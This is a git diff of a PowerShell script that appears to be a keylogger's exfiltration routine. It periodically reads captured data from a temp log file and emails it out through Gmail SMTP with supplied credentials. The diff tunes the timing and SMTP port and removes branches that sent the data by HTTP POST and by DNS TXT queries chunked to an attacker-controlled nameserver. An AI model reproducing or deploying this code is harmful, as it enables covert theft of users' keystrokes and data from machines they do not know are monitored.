@@ -188,10 +188,10 @@ function script:qeybog
         $check = 0
         while($true) 
         {
-            Start-Sleep -Seconds 25
+            Start-Sleep -Seconds 30
             $pastevalue=Get-Content $env:temp\citr.log
             $read++
-            if ($read -eq 15)
+            if ($read -eq 30)
             {
                 $now = Get-Date;
                 $name = $env:COMPUTERNAME 
@@ -234,7 +234,7 @@ function script:qeybog
                     #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                     $smtpserver = "smtp.gmail.com"
                     $msg = new-object Net.Mail.MailMessage
-                    $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+                    $smtp = new-object Net.Mail.SmtpClient($smtpServer, 587 )
                     $smtp.EnableSsl = $True
                     $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                     $msg.From = "$username@gmail.com"
@@ -247,29 +247,6 @@ function script:qeybog
                         $msg.Attachments.Add($att)
                     }
                     $smtp.Send($msg)
-                }
-
-                elseif ($exfiloption -eq "webserver")
-                {
-                    $Data = Compress-Encode    
-                    post_http $URL $Data
-                }
-                elseif ($ExfilOption -eq "DNS")
-                {
-                    $lengthofsubstr = 0
-                    $code = Compress-Encode
-                    $queries = [int]($code.Length/63)
-                    while ($queries -ne 0)
-                    {
-                        $querystring = $code.Substring($lengthofsubstr,63)
-                        Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
-                        $lengthofsubstr += 63
-                        $queries -= 1
-                    }
-                    $mod = $code.Length%63
-                    $query = $code.Substring($code.Length - $mod, $mod)
-                    Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"
-
                 }
                 Out-File -FilePath $env:temp\citr.log -Force -InputObject " " 
                 $read = 0
